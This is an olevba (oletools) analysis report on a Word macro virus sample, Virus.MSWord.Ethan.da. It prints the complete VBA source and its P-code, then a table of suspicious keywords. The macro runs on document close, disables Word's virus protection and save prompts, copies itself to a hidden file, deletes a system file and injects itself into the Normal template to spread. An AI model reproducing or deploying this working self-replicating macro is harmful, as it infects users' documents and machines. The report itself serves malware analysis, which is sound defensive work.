olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options
 .ConfirmConversions = False
 .VirusProtection = False
 .SaveNormalPrompt = False
End With
'----------------------------------------------------------------------------------------------
Randomize
'----------------------------------------------------------------------------------------------
If Dir("c:\ethan.___", 6) = "" Then
 Open "c:\ethan.___" For Output As #1
 For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  Print #1, a
 Next i
 Close #1
 SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
 Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
 Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
 t = ""
End If
If t <> "" Then
 Open "c:\ethan.___" For Input As #1
 If LOF(1) = 0 Then
  GoTo q
 End If
 i = 1
 Do While Not EOF(1)
  Line Input #1, a
  t.CodeModule.InsertLines i, a
  i = i + 1
 Loop
End If
q:
Close #1
'----------------------------------------------------------------------------------------------
If Rnd < 0.3 Then
 With Dialogs(wdDialogFileSummaryInfo)
  .Title = "Ethan Frome"
  .Author = "EW/LN/CB"
  .Keywords = "Ethan"
  .Execute
 End With
End If
'----------------------------------------------------------------------------------------------
If Left(ActiveDocument.Name, 8) <> "Document" Then
 ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then
 ActiveDocument.Saved = s
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.da
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8551 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #3:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #8:
' 	EndWith 
' Line #9:
' 	QuoteRem 0x0000 0x005E "----------------------------------------------------------------------------------------------"
' Line #10:
' 	ArgsCall Read 0x0000 
' Line #11:
' 	QuoteRem 0x0000 0x005E "----------------------------------------------------------------------------------------------"
' Line #12:
' 	LitStr 0x000C "c:\ethan.___"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x000C "c:\ethan.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #15:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #19:
' 	LitStr 0x000C "c:\ethan.___"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "c:\class.sys"
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ne 
' 	ElseIfBlock 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	LitStr 0x0000 ""
' 	St t 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	Ld t 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #30:
' 	LitStr 0x000C "c:\ethan.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #31:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	GoTo q 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	St i 
' Line #35:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #37:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #38:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #39:
' 	Loop 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Label q 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #43:
' 	QuoteRem 0x0000 0x005E "----------------------------------------------------------------------------------------------"
' Line #44:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	IfBlock 
' Line #45:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #46:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' Line #47:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' Line #48:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywords 
' Line #49:
' 	ArgsMemCallWith Execute 0x0000 
' Line #50:
' 	EndWith 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	QuoteRem 0x0000 0x005E "----------------------------------------------------------------------------------------------"
' Line #53:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #54:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	IfBlock 
' Line #57:
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #58:
' 	EndIfBlock 
' Line #59:
' Line #60:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

